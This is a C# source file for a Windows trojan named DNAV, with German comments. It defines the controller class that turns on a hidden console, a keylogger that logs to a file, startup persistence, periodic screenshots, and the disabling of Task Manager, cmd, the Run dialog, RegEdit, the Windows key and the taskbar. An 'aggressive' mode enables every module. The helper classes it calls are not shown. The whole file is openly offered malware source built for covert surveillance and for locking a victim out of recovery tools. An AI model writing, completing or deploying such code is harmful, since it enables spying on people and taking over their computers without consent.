using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Security.Principal;

namespace DNAV_Trojaner
{
    public class DNAV
    {
        private bool _isAdmin;

        private bool _hide;
        private bool _keylogger;
        private string _keyloggerLogPath;
        private bool _autostart;
        private bool _screenshots;
        private string _screenshotsPath;
        private int _screenshotsInterval;
        private bool _disableCmd;
        private bool _disableRun;
        private bool _disableTaskmanager;
        private bool _disableWindowsKey;
        private bool _disableRegEdit;
        private bool _hideTaskbar;

        private bool checkAdmin()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        /// <summary>
        /// Legt fest, ob das Konsolenfenster versteckt wird.
        /// </summary>
        public bool Hide
        {
            get
            {
                return this._hide;
            }
            set
            {
                this._hide = value;
            }
        }

        /// <summary>
        /// Legt fest, ob die Keylogger Funktion aktiviert wird.
        /// </summary>
        public bool Keylogger
        {
            get
            {
                return this._keylogger;
            }
            set
            {
                this._keylogger = value;
            }
        }

        /// <summary>
        /// Legt den Ort fest, an dem die Logdatei des Keyloggers erstellt wird.
        /// </summary>
        public string KeyloggerLogPath
        {
            get
            {
                return this._keyloggerLogPath;
            }
            set
            {
                this._keyloggerLogPath = value != "" ? value : "log.txt";
            }
        }

        /// <summary>
        /// Legt fest, ob der Trojaner automatisch mit Windows gestartet werden soll.
        /// </summary>
        public bool Autostart
        {
            get
            {
                return this._autostart;
            }
            set
            {
                this._autostart = value;
            }
        }

        /// <summary>
        /// Legt fest, ob die Screenshot Funktion aktiviert wird.
        /// </summary>
        public bool Screenshots
        {
            get
            {
                return this._screenshots;
            }
            set
            {
                this._screenshots = value;
            }
        }

        /// <summary>
        /// Legt den Ort fest, an dem die Screenshots gespeichert werden sollen.
        /// </summary>
        public string ScreenshotsPath
        {
            get
            {
                return this._screenshotsPath;
            }
            set
            {
                this._screenshotsPath = value != "" ? value : "screen.png";
            }
        }

        /// <summary>
        /// Legt fest, in welchem Interval die Screenshots der Screenshot Funktion erstellt werden. Die Screenshot Funktion muss aktiviert sein, damit diese Eigenschaft Wirkung zeigt.
        /// </summary>
        public int ScreenshotsInterval
        {
            get
            {
                return this._screenshotsInterval;
            }
            set
            {
                this._screenshotsInterval = value >= 1 ? value : 1;
            }
        }

        /// <summary>
        /// Legt fest, ob die Konsole deaktiviert werden soll.
        /// </summary>
        public bool DisableCmd
        {
            get
            {
                return this._disableCmd;
            }
            set
            {
                this._disableCmd = value;
            }
        }

        /// <summary>
        /// Legt fest, ob der Ausführen-Dialog deaktiviert werden soll.
        /// </summary>
        public bool DisableRun
        {
            get
            {
                return this._disableRun;
            }
            set
            {
                this._disableRun = value;
            }
        }

        /// <summary>
        /// Legt fest, ob der Taskmanager deaktiviert werden soll.
        /// </summary>
        public bool DisableTaskmanager
        {
            get
            {
                return this._disableTaskmanager;
            }
            set
            {
                this._disableTaskmanager = value;
            }
        }

        /// <summary>
        /// Legt fest, ob die Windows Taste deaktiviert werden soll. Ein Klick auf das Startmenü öffnet dieses jedoch immernoch.
        /// </summary>
        public bool DisableWindowsKey
        {
            get
            {
                return this._disableWindowsKey;
            }
            set
            {
                this._disableWindowsKey = value;
            }
        }

        /// <summary>
        /// Legt fest, ob der Registrierungseditor deaktiviert werden soll.
        /// </summary>
        public bool DisableRegEdit
        {
            get
            {
                return this._disableRegEdit;
            }
            set
            {
                this._disableRegEdit = value;
            }
        }

        /// <summary>
        /// Legt fest, ob die Taskleiste ausgeblendet werden soll.
        /// </summary>
        public bool HideTaskbar
        {
            get
            {
                return this._hideTaskbar;
            }
            set
            {
                this._hideTaskbar = value;
            }
        }

        /// <summary>
        /// Erstellt ein Objekt der DNAV Klasse mit Standardparametern.
        /// </summary>
        public DNAV()
        {
            this._isAdmin = checkAdmin();
            this.Hide = false;
            this.Keylogger = false;
            this.KeyloggerLogPath = "log.txt";
            this.Autostart = true;
            this.Screenshots = false;
            this.ScreenshotsPath = "screen.png";
            this.ScreenshotsInterval = 180;
            this.DisableCmd = false;
            this.DisableRun = false;
            this.DisableTaskmanager = false;
            this.DisableWindowsKey = false;
            this.DisableRegEdit = false;
            this.HideTaskbar = false;
        }

        /// <summary>
        /// Erstellt ein Objekt der DNAV Klasse mit festgelegten Parametern.
        /// </summary>
        /// <param name="aggressive">Wenn gesetzt, sind alle Module aktiviert.</param>
        public DNAV(bool aggressive) : this()
        {
            this.Hide = true;
            this.Keylogger = true;
            this.KeyloggerLogPath = "log.txt";
            this.Autostart = true;
            this.Screenshots = aggressive;
            this.ScreenshotsPath = "screen.png";
            this.ScreenshotsInterval = 10;
            this.DisableCmd = aggressive;
            this.DisableRun = aggressive;
            this.DisableTaskmanager = aggressive;
            this.DisableWindowsKey = aggressive;
            this.DisableRegEdit = aggressive;
            this.HideTaskbar = aggressive;
        }

        /// <summary>
        /// Startet den Trojaner mit den festgelegten Modulen
        /// </summary>
        public void Start()
        {
            if (this.Hide)
            {
                DNAV_Trojaner.Keylogger.Hide();
            }
            if (this.Keylogger)
            {
                Thread keylogger = new Thread(() => DNAV_Trojaner.Keylogger.EnableWithLog(this.KeyloggerLogPath));
                keylogger.Start();
            }
            if (this.Autostart && this._isAdmin)
            {
                Startup.EnableForAdmin();
            }
            if (this.Autostart && !this._isAdmin)
            {
                Startup.Enable();
            }
            if (this.Screenshots)
            {
                ScreenCapture sc = new ScreenCapture();
                Thread screenshot = new Thread(() => sc.CaptureScreenToFile(this.ScreenshotsPath, System.Drawing.Imaging.ImageFormat.Png, this.ScreenshotsInterval));
                screenshot.Start();
            }
            if (this.DisableCmd && this._isAdmin)
            {
                Cmd.Disbable();
            }
            if (this.DisableRun && this._isAdmin)
            {
                Run.Disbable(); 
            }
            if (this.DisableTaskmanager && this._isAdmin)
            {
                Taskmanager.Disable();
            }
            if (this.DisableWindowsKey && this._isAdmin)
            {
                WindowsKey.Disable();
            }
            if (this.DisableRegEdit && this._isAdmin)
            {
                RegEdit.Disable();
            }
            if (this.HideTaskbar)
            {
                Taskbar.Hide();
            }
        }
    }
}
